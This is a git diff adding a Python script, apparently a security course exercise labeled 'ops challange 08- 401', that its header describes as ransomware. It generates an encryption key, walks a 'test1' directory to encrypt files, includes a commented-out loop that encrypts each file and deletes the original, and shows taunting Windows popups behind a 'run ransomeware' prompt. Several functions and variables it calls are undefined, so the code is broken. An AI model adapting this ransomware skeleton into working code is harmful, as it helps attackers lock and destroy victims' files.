@@ -1,1 +1,97 @@
-Dom Moore
+#!/usr/bin/env python3
+
+# Script Name               ops challange 08- 401
+# Author                    Dom Moore
+# Date                      10/15/20
+# Description of purpose    Encryption & Decryption Directory python / ransomware
+
+# import libraries
+
+import pyAesCrypt
+import glob
+from cryptography.fernet import Fernet
+import os
+import bckgrnd
+import win32ui, win32con
+
+
+# FUNCTIONS #
+
+# Create Key
+def write_key():
+    # Generates a key and save it into a file
+    key = Fernet.generate_key()
+    with open("key.key", "wb") as key_file:
+        key_file.write(key)
+
+# Initialize the key
+def load_key():
+    """
+    Loads the key from the current directory named `key.key`
+    """
+    return open("key.key", "rb").read()
+
+# Encrypt files in directoty
+def file_path_enc():
+    Dir_path = r"test1\\**\*"
+    for (root, dirs, files) in os.walk(Dir_path, topdown = False):
+        for name in files:
+            path = os.path.join(root, name)
+            print("Name if file is ", name)
+            encrypt_file(path, key)
+
+# Decrypt Files in Directory
+def file_path_dec():
+    Dir_path = r"test1\\**\*"
+    for (root, dirs, files) in os.walk(Dir_path, topdown = False):
+        for name in files:
+            path = os.path.join(root, name)
+            print("Accessing", name)
+            decrypt_file(path, key)
+
+
+
+# For loop to encrypt all files (pyAesCrypt)
+"""
+for file in glob.glob('test1\\**\*', recursive=True):
+    fullpath = os.path.join(curDir, file)
+    fullnewf = os.path.join(curDir, + file + '.aes')
+    #Encrypt
+    if os.path.isfile(fullpath):
+        print('>>> Orginal: \t' + fullpath + '')
+        print('>>> Encrypted: \t' + fullnewf + '\n')
+        pyAesCrypt.encryptFile(fullpath,fullnewf, passwd, buffersz)
+        # Remove file after Encrypted
+        os.remove(fullpath)
+        
+# For loop to Decrypt all files (pyAesCrypt)
+
+for file in glob.glob('testops\\**\*', recursive=True):
+    fullpath = os.path.join(filDir, file)
+    fullnewf = os.path.join(filDir,os.path.splitext(x)[0])
+    #Dncrypt
+    if os.path.isfile(fullpath):
+        print('>>> Encrypted: \t' + fullpath + '')
+        try:
+            pyAesCrypt.decryptFile(fullpath, fullnewf, passwd, buffersz)
+            print('>>> Decrypted: \t' + fullpath + '\n')
+            os.remove(fullpath)
+
+"""
+
+# Popup windows Function
+def popup_Win():
+    win_request = win32ui.MessageBox(" Today is your lucky day", win32con.MB_ICONASTERISK)
+    win_request = win32ui.MessageBox("Having fun yet!", win32con.MB_YESNO)
+    if response == win32con.IDYES:
+        win32ui.MessageBox("Today dosent look to lucky for you")
+    elif response == win32con.IDNO:
+        win32ui.MessageBox(" Nice Try")
+    
+
+# Run ransomeware window
+popup_Win = input("Do you want to run ransomeware")
+if (popup_Win == "y"):
+    pop_up()
+else:
+    print(" Maybe Next time...")
